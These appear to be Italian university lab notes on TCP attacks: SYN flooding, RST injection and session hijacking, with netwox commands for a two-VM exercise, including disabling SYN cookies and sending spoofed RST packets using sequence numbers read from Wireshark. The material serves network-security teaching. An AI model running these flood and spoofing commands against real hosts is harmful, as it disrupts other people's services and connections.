# TCP Connections, Send/Receive Buffers
![TCP buffers](/assets/sicurezza_informatica/tcp-connection-buffers.png)<br>

## Stabilire una connessione
![TCP connections](/assets/sicurezza_informatica/tcp-connection.png)<br>

# Overview attacchi

# SYN Flooding Attack
![SYN Flooding attack](/assets/sicurezza_informatica/syn-flooding-attackpng.png)<br>
L'attaccante è in grado di produrre tanti SYN verso il server con una serie di IP casuali spoofati con lo scopo di saturare la coda dei SYN e fare in modo che il server non accetti più connessioni.<br>
SYN flood è una forma di attacco DoS, gli aggressori possono inondare la coda della vittima<br>
La dimensione della coda ha un'impostazione a livello di sistema<br>


# RST Attack
![RST Attack](/assets/sicurezza_informatica/rst-attack.png)<br>
Attacco di RST : Attaccante crea un pacchetto spoofato (ad esempio al posto di Alice) e manda un pacchetto FIN con il giusto seq number per chiudere la connessione, DEVE individuare i giusti sequence number<br>
Lanciare un attacco TCP RST per interrompere una connessione telnet esistente tra VM A e VM B<br>
1. Aprire una connessione telnet da A a B
2. su A esaminare il pacchetto TCP con Wireshark
3. Invia un pacchetto da A netwox 40 –l src –m dst –o 23 –p port –B –q number (usa il prossimo numero di sequenza nel pacchetto telnet)
4. La connessione dovrebbe essere interrotta

# TCP Session Hijacking Attack
Hijacking : posso intervenire in una sessione tra client e server e posso (se riesco a capire il giusto seq number) intromettermi in una conversazione legittima tra client e server, e il server non sarà in grado di distinguere un pacchetto mandato dal client o un pacchetto mandato dall'attaccante spoofato


# Toolbox netwox
```bash
netwox number
``` 
È un toolbox che ti aiuta a trovare e risolvere problemi di network, ha 223 tool al suo interno identificati da un numero (quello da dare dopo il comnado)

```bash
netwox 76
``` 
Il tool 76 è il tool di SYN Flood

```bash
netwox 76 -i "ip" -p "port" [-s "spoofip"]
``` 

# Pre-eserizio macchina 1 (.4)
Per vedere quanto è grossa la coda dei SYN nel backlog:
```bash
sudo sysctl -q net.ipv4.tcp_max_syn_backlog
``` 

Per vedere le connessioni attualmente presenti:
```bash
neststat -na
``` 

Per vedere se i cookie sono abilitati o meno (cookie sono una tecnica di prevenzione al attacco SYN flood), se = 1 abilitati
```bash
sudo sysctl -a | grep cookie
``` 
Per togliere la protezione dei cookie :
```bash
sudo sysctl net.ipv4.tcp_syncookies=0
``` 

# Macchina 2 lancia l'attacco SYN Flood(.5)
Lanciamo la toolbox con il tool di SYN Flood
```bash
sudo netwox 76 -i x.x.x.4 -p 80
``` 

Ora vediamo facendo un netstat nella macchina 1 vedremo che ci saranno molti SYN_RECV da parte di diversi IP (generati dalla macchina 2 durante l'attacco)<br>
Possiamo anche aprire wireshark sulla macchina 2 per vedere la situazione del traffico in rete.

# Macchina 2 - Attacco RST (.5)
Prima cosa da fare è avviare un telnet tra macchina .5 e .4 (volendo si può fare con 3 macchina ma in questo esempio ne useremo 2)<br>
Questo tool manda pacchetti RST (spoofati e non)

```bash
sudo netwox 78 -d [interfaccia di rete]
``` 
dopo aver avviato il tool, la connessione telnet all'inserimento di un altro comando cadrà<br>
Grazie a netwox 40 posso creare un pacchetto spoofato
```bash
sudo netwox 40 -l [IP sorgente] -m [IP destinazione] -o [porta di orgine] -p [porta di destinazione]-B -q [sequence number]
``` 
- -B : RST Attivo
- -q : next seq number

Per trovare i paramentri vado a prendere il pacchetto su wireshark di un pacchetto precedente (Attenzione a sorg e destinazione che devono combaciare con quelli del pacchetto che sto creando)<br>
La connessione su telnet verrà chiusa automaticamente dopo che questo pacchetto viene spedito
